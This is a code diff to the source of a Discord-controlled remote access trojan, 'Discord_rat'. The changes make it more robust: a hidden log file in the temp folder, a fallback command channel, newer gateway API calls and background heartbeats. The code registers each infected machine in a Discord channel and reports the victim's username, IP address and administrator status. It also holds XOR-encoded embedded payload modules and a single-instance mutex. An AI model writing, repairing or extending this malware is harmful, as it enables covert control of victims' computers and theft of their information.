@@ -91,10 +91,10 @@ namespace Discord_rat
                         break;
                     };
                    outputStream.Position = 0;
-                   await Task.Factory.StartNew(() => ResponseReceived(outputStream));
+                   await ResponseReceived(outputStream).ConfigureAwait(false);
                 }
            }
-           catch (Exception s) { Console.WriteLine(s); }
+           catch (Exception s) { Program.LogDebug("WS error: " + s); Console.WriteLine(s); }
            finally
            {
               outputStream?.Dispose();
@@ -153,6 +153,18 @@ namespace Discord_rat
         public static string PayloadRoot = null;
         public static Dictionary<string, byte[]> EmbeddedModules = new Dictionary<string, byte[]>();
         private const byte PayloadXorKey = 0xA7;
+
+        public static void LogDebug(string message)
+        {
+            try
+            {
+                string path = Path.Combine(Path.GetTempPath(), "wrprov.log");
+                File.AppendAllText(path, DateTime.Now.ToString("HH:mm:ss") + " " + message + Environment.NewLine);
+            }
+            catch
+            {
+            }
+        }
 
         private static string GetInstanceMutexName()
         {
@@ -311,16 +323,28 @@ namespace Discord_rat
             instanceMutex = new Mutex(true, GetInstanceMutexName(), out created);
             if (!created)
             {
+                LogDebug("Mutex already held, exiting Start()");
                 return;
             }
 
+            LogDebug("Start() running on " + Environment.UserName);
             MainAsync().GetAwaiter().GetResult();
         }
         public static async Task MainAsync()
         {
-            client.ResponseReceived = Responsehandler;
-            await client.ConnectAsync("wss://gateway.discord.gg/?v=9&encoding=json");
-            await client.WaitUtillDead();
+            try
+            {
+                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12 | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls;
+                LogDebug("Connecting gateway...");
+                client.ResponseReceived = Responsehandler;
+                await client.ConnectAsync("wss://gateway.discord.gg/?v=10&encoding=json");
+                LogDebug("Gateway connected, waiting...");
+                await client.WaitUtillDead();
+            }
+            catch (Exception ex)
+            {
+                LogDebug("MainAsync failed: " + ex);
+            }
         }
         public static async Task heartbeat(int milliseconds)
         {
@@ -346,10 +370,17 @@ namespace Discord_rat
             var guilds_id = ObjectToDictionary(data["d"])["id"];
             var channels = ObjectToDictionary(data["d"])["channels"];
             int biggest = 1;
+            string fallbackChannelId = null;
+
             foreach (Dictionary<object, object> dict in ObjectToArray(channels))
             {
                 if ((int)dict["type"] == 0)
                 {
+                    if (fallbackChannelId == null)
+                    {
+                        fallbackChannelId = dict["id"].ToString();
+                    }
+
                     if (((string)dict["name"]).StartsWith("session-"))
                     {
                         session_channel_holder[(string)dict["name"]] = dict["id"].ToString();
@@ -361,23 +392,49 @@ namespace Discord_rat
                     }
                 }
             }
-            string url = string.Format("https://discord.com/api/v9/guilds/{0}/channels", (string)guilds_id);
-            var payload = new Dictionary<object, object> { { "name", "session-" + biggest.ToString() }, { "type", 0 } };
-            var textpayload = DictionaryToJson(payload);
-            HttpClient httpClient = new HttpClient();
-            httpClient.DefaultRequestHeaders.Add("authorization", "Bot " + BotToken);
-            var content = new StringContent(textpayload, Encoding.UTF8, "application/json");
-            var result = await httpClient.PostAsync(url, content);
-            result.EnsureSuccessStatusCode();
-            var response = await result.Content.ReadAsStringAsync();
-            var newdict = JsonToDictionary(response);
-            var new_channel_id = newdict["id"];
-            httpClient.Dispose();
-            string starting_payload = string.Format("@here :white_check_mark: New session opened {0} | User: {2} | IP: {1} | Admin: {3}", "session-" + biggest.ToString(),await getip(), Environment.UserName,(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)).ToString());
-            await Send_message((string)new_channel_id, starting_payload);
+
+            string sessionName = "session-" + biggest.ToString();
+            string channelId = null;
+
+            try
+            {
+                string url = string.Format("https://discord.com/api/v10/guilds/{0}/channels", (string)guilds_id);
+                var payload = new Dictionary<object, object> { { "name", sessionName }, { "type", 0 } };
+                var textpayload = DictionaryToJson(payload);
+                HttpClient httpClient = new HttpClient();
+                httpClient.DefaultRequestHeaders.Add("authorization", "Bot " + BotToken);
+                var content = new StringContent(textpayload, Encoding.UTF8, "application/json");
+                var result = await httpClient.PostAsync(url, content);
+                var response = await result.Content.ReadAsStringAsync();
+                if (!result.IsSuccessStatusCode)
+                {
+                    LogDebug("Create channel failed: " + (int)result.StatusCode + " " + response);
+                    throw new Exception("Channel create failed: " + response);
+                }
+
+                var newdict = JsonToDictionary(response);
+                channelId = newdict["id"].ToString();
+                httpClient.Dispose();
+            }
+            catch (Exception ex)
+            {
+                LogDebug("CreateHostingChannel fallback: " + ex.Message);
+                channelId = fallbackChannelId;
+                sessionName = "fallback";
+            }
+
+            if (string.IsNullOrEmpty(channelId))
+            {
+                LogDebug("No channel available for session");
+                return null;
+            }
+
+            string starting_payload = string.Format("@here :white_check_mark: New session opened {0} | User: {2} | IP: {1} | Admin: {3}", sessionName, await getip(), Environment.UserName, (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)).ToString());
+            await Send_message(channelId, starting_payload);
             HelpMenuMessageId = null;
-            await helpmenu((string)new_channel_id);
-            return (string)new_channel_id;
+            await helpmenu(channelId);
+            LogDebug("Session opened on channel " + channelId);
+            return channelId;
         }
         public static async Task handler(Dictionary<object, object> data)
         {
@@ -385,7 +442,8 @@ namespace Discord_rat
             {
                 case 10:
                     await login(BotToken);
-                    await heartbeat((int)ObjectToDictionary(data["d"])["heartbeat_interval"]);
+                    LogDebug("Gateway hello, logged in");
+                    _ = Task.Run(async () => await heartbeat((int)ObjectToDictionary(data["d"])["heartbeat_interval"]));
                     break;
                 case 11:
                     Console.WriteLine("recived heartbeat");
@@ -402,7 +460,10 @@ namespace Discord_rat
                             if ((string)guilds_id == GuildId)
                             {
                                 var main_channel_id = await CreateHostingChannel(data);
-                                ChannelId = main_channel_id;
+                                if (!string.IsNullOrEmpty(main_channel_id))
+                                {
+                                    ChannelId = main_channel_id;
+                                }
                             }
                             break;
                         case "MESSAGE_CREATE":
